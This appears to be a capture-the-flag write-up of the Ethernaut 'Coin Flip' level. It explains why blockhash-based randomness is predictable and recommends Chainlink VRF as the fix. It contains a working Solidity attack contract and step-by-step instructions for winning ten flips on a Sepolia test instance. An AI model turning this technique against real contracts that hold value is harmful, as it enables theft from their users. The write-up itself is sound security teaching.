# Level 3: Coin Flip

**Difficulty:** Medium

**Vulnerability:** Predictable randomness using blockhash

## How it Works

The contract asks to guess a coin flip 10 times in a row. The "random" result is calculated like this:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

`blockhash(block.number - 1)` gets the hash of the previous block and converts it to a big integer. Dividing by `FACTOR` squashes it down to either 0 or 1, which maps to `false` or `true`.

The problem is that the blockchain is fully public. Anyone can read `blockhash(block.number - 1)` — it's not a secret. So the result is predictable before calling `flip()`.

## The Exploit Idea

All actions inside the same contract function happen in the same block. That means `block.number` is the same throughout the entire `attack()` call, including when it calls into the CoinFlip contract.

So the attack contract can use that shared `block.number` to calculate the previous block's hash, work out the "random" result, and call `flip()` with the exact correct answer, all in one go.

## What I Learned Along the Way

### Calling another deployed contract

To call a function on a deployed contract, Solidity needs to know two things: the contract's address and what functions it has (the interface).

An interface declares the function signatures without implementing them:

```solidity
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

The `I` prefix is just a naming convention standing for Interface. Then to call it:

```solidity
ICoinFlip(contractAddress).flip(side);
```

### The `lastHash` guard

The CoinFlip contract has this check:

```solidity
if (lastHash == blockValue) {
    revert();
}
```

This prevents calling `flip()` twice in the same block. Calling `attack()` too quickly before a new block is mined causes a revert. Had to wait around 15 to 20 seconds between each call on Sepolia.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ICoinFlip(0x750c2807e9b76Df705d689DCb270Ce35B47B712F).flip(side);
    }
}
```

## Exploit Steps

1. Deploy `CoinFlipAttack` on Remix using Injected Provider (MetaMask on Sepolia)
2. Call `attack()` 10 times, waiting around 15 to 20 seconds between each call for a new block
3. Check progress in the Ethernaut console:
```js
await contract.consecutiveWins()
```
4. Submit the instance once it reaches 10

## Key Takeaway

Blockhash is not a safe source of randomness. It's public information that any contract can read, and an attack contract running in the same transaction sees the exact same blockhash, so the outcome is fully predictable.

### Why on-chain randomness is hard

Everything on the blockchain is deterministic and public. Every value used in a calculation (block number, timestamp, blockhash) can be read by anyone including other contracts. There is no such thing as a private or unpredictable value on-chain.

### The right way: Chainlink VRF

The standard solution is to use an oracle, which is an external service that brings data from outside the blockchain into a smart contract.

Chainlink VRF (Verifiable Random Function) works like this:
1. The contract requests a random number from Chainlink
2. Chainlink generates the number off-chain, where it can't be seen or manipulated by anyone on-chain
3. Chainlink delivers the number back to the contract along with a cryptographic proof that the number wasn't tampered with
4. The contract verifies the proof before using the number

The key difference from blockhash is that the randomness comes from outside the blockchain, so no contract or miner can predict or manipulate it before it arrives.

**Vulnerability category:** Weak Randomness / Predictable On-chain Data
